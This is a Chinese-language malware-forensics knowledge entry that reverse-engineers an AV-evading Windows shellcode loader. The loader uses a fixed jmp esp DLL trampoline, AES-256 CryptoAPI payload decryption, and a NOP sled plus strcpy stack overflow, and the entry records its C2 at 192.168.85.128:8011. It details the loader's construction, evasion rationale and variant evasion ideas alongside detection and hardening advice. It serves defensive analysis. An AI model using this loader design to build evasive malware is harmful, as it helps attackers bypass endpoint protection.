---
id: code-analysis-reverse-windows-jmp-esp-dll-aes-shellcode-stack-overflow-loader
title: 免杀 loader 取证：fun.dll 只提供固定 jmp esp 跳板，AES-256 解密 shellcode 后经 NOP sled + strcpy 栈溢出控制执行
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: jmp-esp-dll-aes-shellcode-stack-overflow-loader
aliases:
- 愤怒的小鸟.exe
- fun.dll
- jmp esp 跳板
- AES shellcode loader
- CryptoAPI CryptDeriveKey shellcode
- NOP sled 栈溢出 shellcode
- scdbg 外连分析
- 免杀 loader 取证
tags:
- reverse-engineering
- windows
- malware
- loader
- shellcode
- aes
- cryptoapi
- jmp-esp
- stack-overflow
- nop-sled
- scdbg
- x64dbg
- evasion
- forensics
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V364-fix
  verified_at: '2026-11-09T04:08:59+08:00'
  notes: V364 核对指出栈布局笔误：IDA 中 v13 在 ebp-0x2725，v15 为 ebp-0x2720 起 0x7DC 字节缓冲，v16 在 ebp-0x1F44（v15+0x7DC），代码为 v16=v13；正是 v16 在 strcpy 时覆盖 Function 返回地址。已把两处 v15=v13 相关表述改为 v16=v13，并把 Function 内 char v2 说明改为单字节 char（strcpy 溢出）。其余 CryptoAPI AES-256、jmp esp、NOP sled、C2 证据核对不变。
---

## 一句话结论

一个 32 位 Windows 恶意样本把免杀重点放在“异常执行流”而非常见恶意 API：主程序在栈上填 2012 字节 `A`、放入外部 `fun.dll` 中固定地址的 `jmp esp`（`0x62501443`）、用 CryptoAPI AES-256 解密 `.rdata` 中的 shellcode、把 NOP sled 与解密后的 payload 拼到栈上，最后调用一个只有 `strcpy` 的函数触发栈溢出，用 `jmp esp` 覆盖返回地址并经 NOP sled 执行 shellcode；整个过程不使用 `VirtualAlloc/CreateRemoteThread/WriteProcessMemory`，常规杀软静态/动态扫描未拦截，但 scdbg 与流量监控可定位 C2 `192.168.85.128:8011`。

## 原理

- **样本结构与导入**：目录下 `愤怒的小鸟.exe`（约 41 KB，PE32、32 位 I386、MinGW/GNU ld 2.32、未加壳）与 `fun.dll`（约 32 KB）。pe-bear 显示导入 `ADVAPI32.dll`、`KERNEL32.dll`、`msvcrt.dll`（编译默认）以及第三方 `fun.dll`，其中只用到 `Vulkkn` 这一个导出。
- **固定跳板**：IDA 打开 `fun.dll`，`_Jmp_Esp` 位于 `0x62501443`，指令为 `push ebp; mov ebp, esp; jmp esp`。把 `jmp esp` 放在独立 DLL 中是为了获得跨环境稳定的固定地址（该 DLL 无重定位/ASLR 干扰），主程序只把这个地址当作常量使用。
- **AES 解密**：`main` 从 `.rdata` 取 16 字节 key（示例 `0x404250`：`16 D0 C8 51 F9 8C 1A CF 43 F4 A1 F0 E4 62 00 EA`）和 0x240（576）字节加密 payload（`0x404000`），调用 `__i3b_D2`：
  - `CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES (0x18), CRYPT_VERIFYCONTEXT (0xF0000000))`
  - `CryptCreateHash(hProv, CALG_SHA_256 (0x800C), 0, 0, &hHash)`
  - `CryptHashData(hHash, key, 16, 0)`
  - `CryptDeriveKey(hProv, CALG_AES_256 (0x6610), hHash, 0, &hKey)`
  - `CryptDecrypt(hKey, NULL, 0, 0, payload, &len)`（原地解密）
  即 16 字节 key 经 SHA-256 哈希后再由 CryptoAPI 派生 AES-256 密钥；payload 在 `.rdata` 中始终以密文形态存在，静态特征弱。
- **栈布局与溢出**：
  - `memset(&v15, 'A', 2012)`（0x7DC）把一段栈缓冲填满 `A`，这些垃圾数据用于精确顶到保存的返回地址；
  - `v13 = 0x62501443`，随后被写到紧随缓冲区的 `v16`（`v16 = v13`；v16 位于 ebp-0x1F44，即 v15 缓冲起点 ebp-0x2720 + 0x7DC）；
  - `v10/v11` 来自 `.rdata 0x404240` 的 NOP sled（`0x90` × 0x20），`memcpy(&v17, &v10, 0x20)` 拷到栈上；
  - `memcpy(&v18, &v6, 0x23F)` 把解密后的 payload 拷到 NOP sled 之后；
  - `Function(&v15)` 内部只有单字节 `char v2; return strcpy(&v2, a1);`，`strcpy` 把整段拼接缓冲复制到该单字节栈变量，溢出覆盖返回地址为 `0x62501443`（jmp esp）。
- **执行流**：函数返回 → 跳 `fun.dll!0x62501443` 的 `jmp esp` → `ESP` 指向栈上的 NOP sled → 滑到解密后的 shellcode 执行。x64dbg 在 `0x4017E8` 处可看到 `jmp dword ptr ds:[<&Vulkkn>]`，断在 `0x62501443` 后栈顶为 NOP sled（`0x60D520` 起 0x90），`0x60D540` 起为解密后的指令。
- **shellcode 与外连**：用 scdbg 对导出并解密后的 `msf.bin` 执行 `scdbg.exe /api /f .\msf.bin`，可见 `LoadLibraryA(wininet)`、`InternetOpenA("Mozilla/5.0 ... Safari/604.1")`、`InternetConnectA(server: 192.168.85.128, port: 8011)`，说明是 MSF/CS 风格 HTTP payload；火绒流量监控也显示 `愤怒的小鸟.exe` 从本地 `192.168.85.151:50218` 连向 `192.168.85.128:8011`（正文文字有一处写成 129.168.85.128，以 scdbg/流量截图证据为准）。
- **为什么能免杀**：没有使用常见恶意行为链（分配可执行内存、远程线程注入、进程镂空等），payload 加密存储、运行时在栈上解密执行；恶意逻辑依赖 `strcpy` 栈溢出和 DLL 里的单个 `jmp esp`，静态特征与行为 API 都很少。代价是依赖栈可执行（DEP 未强制）和固定地址跳板，换环境可能失效。
- **取证关键点**：DIE 判无壳/32 位 → IDA 看 main 的四大常量（A 填充、jmp esp 地址、NOP sled、key/payload）→ pe-bear 找第三方 DLL → IDA 分析 fun.dll → 导出 payload 用 CryptoAPI 解密 → scdbg 快速定位 C2 → x64dbg 动态确认溢出/jmp esp/NOP sled → 流量监控确认外连。

## 触发条件

- 32 位 Windows PE，`/NXCOMPAT` 未启用或 DEP 未对该进程强制（栈可执行），否则 jmp esp 后执行栈上 shellcode 会被拦截。
- 存在一个只有 `jmp esp` 的第三方 DLL，且其加载基址/函数地址固定（无 ASLR 或关闭重定位），使主程序能硬编码 `0x62501443`。
- 主程序存在 `strcpy` 等无长度限制的栈复制，且能精确控制复制内容与长度（本例用 2012 字节 `A` + jmp esp + NOP sled + payload 布局）。
- AES 密钥与密文 payload 存放在可读数据段；运行时用 CryptoAPI 或其等价实现解密。
- 分析环境与样本隔离（断网/快照），避免误触 C2。

## 利用步骤（样本执行 / 分析复现）

1. **样本执行链（恶意侧视角）**：主程序准备 `A` 填充 → 写入 `jmp esp` 地址 → AES 解密 payload → 拼接 NOP sled + payload → `strcpy` 溢出 → 返回地址变 `jmp esp` → NOP sled → shellcode。
2. **静态确认**：DIE 确认 PE32/32 位/无壳；IDA 在 `main` 找 `memset(&v15,'A',2012)`、`0x62501443`、`.rdata 0x404240` 的 `0x90` 串、`0x404250` 的 16 字节 key、`0x404000` 的 0x240 密文。
3. **DLL 分析**：pe-bear 看导入表（`fun.dll!Vulkkn`）；IDA 打开 `fun.dll`，确认 `_Jmp_Esp` 位于 `0x62501443` 且只做 `jmp esp`。
4. **导出并解密 shellcode**：把 `.rdata 0x404000` 起 0x240 字节导出，用 CryptoAPI 脚本（见 PoC）以 16 字节 key 解密；或用等价 Python（SHA-256(key) 派生 AES-256）验证。
5. **scdbg 定位行为**：`scdbg.exe /api /f .\msf.bin`，查看 `InternetConnectA` 的 server/port、`InternetOpenA` 的 UA，判断 C2 与 payload 类型。
6. **动态验证**：x64dbg 在 `0x62501443` 下断，运行到 `strcpy` 返回后观察返回地址变为 jmp esp；单步进入 NOP sled 与 shellcode；System Informer 观察进程与子进程；流量监控确认外连 IP/端口。

## PoC

```c
// CryptoAPI 解密（与样本 __i3b_D2 等价）
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

void aes_de(char *code, DWORD codeLen, char *key, DWORD keyLen) {
    HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return;
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) return;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return;
    CryptDecrypt(hKey, NULL, 0, 0, (BYTE*)code, &codeLen);
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
}
```

```text
# 用 scdbg 快速看 shellcode 外连
scdbg.exe /api /f .\msf.bin
# 输出示例：
# InternetConnectA(server: 192.168.85.128, port: 8011, )
```

## 变体与关联

- **其他 shellcode loader**：x64dbg fiber loader 导出/转储见 [[code-analysis-dynamic-debugging-x64dbg-fiber-loader-shellcode-dump]]；多层 shellcode 解密与 dump 见 [[code-analysis-dynamic-debugging-multi-layer-shellcode-decrypt-dump]]；分段 shellcode 文件加载见 [[code-analysis-dynamic-debugging-split-shellcode-file-loader-xor]]。
- **AES/RC4 配置与 shellcode 解密**：Dridex 的 RC4/Base64 shellcode 提取见 [[code-analysis-reverse-windows-dridex-rc4-base64-aplib-shellcode-extract]]；CryptoAPI SHA1/RC4 配置解密见 [[code-analysis-reverse-obfuscation-cryptapi-sha1-rc4-config-decrypt]]。
- **免杀思路变体**：把 `jmp esp` 换成 `jmp eax`/`call esp`/ROP gadget；用回调（EnumWindows/线程池）代替直接 jmp；用堆/映射内存代替栈执行（但会引入更多可检测 API）。
- **边界**：DEP/ASLR/CFG 开启时该链失败；固定 DLL 基址在不同系统上可能被占用；AES key 硬编码在 `.rdata`，取证时可直接提取。

## 检测与防御

- **静态检测**：PE 导入一个只导出 `jmp esp` 的极小 DLL；`.rdata` 中存在 NOP 长串、16/32 字节高熵 key、0x240 级高熵 payload；导入 CryptoAPI `CryptDeriveKey/CryptDecrypt` 但不常见于正常业务；缺少 `VirtualAlloc/CreateRemoteThread` 等不代表安全。
- **动态检测**：监控栈执行（jmp esp/call esp/ret 到栈）、`strcpy` 大长度复制、CryptoAPI 解密后紧跟 `jmp esp`/函数指针调用；EDR 的内存扫描应在解密后触发；scdbg/unicorn 等模拟执行可快速提取 C2。
- **网络检测**：关注进程首次外连的非常规端口（如 8011）、Mozilla UA 与进程名不匹配、无子进程的长时间 HTTP 连接；结合 DNS/代理日志。
- **加固**：启用 DEP（`/NXCOMPAT`）、ASLR、CFG；启用 Mandatory ASLR；对第三方 DLL 做加载白名单/签名校验；EDR 开启栈执行与 ROP 检测。
- **取证规范**：样本在隔离虚拟机/断网环境分析；记录哈希、DIE/pe-bear 结果、解密 key、C2、进程行为与流量；不要直接运行未知样本。
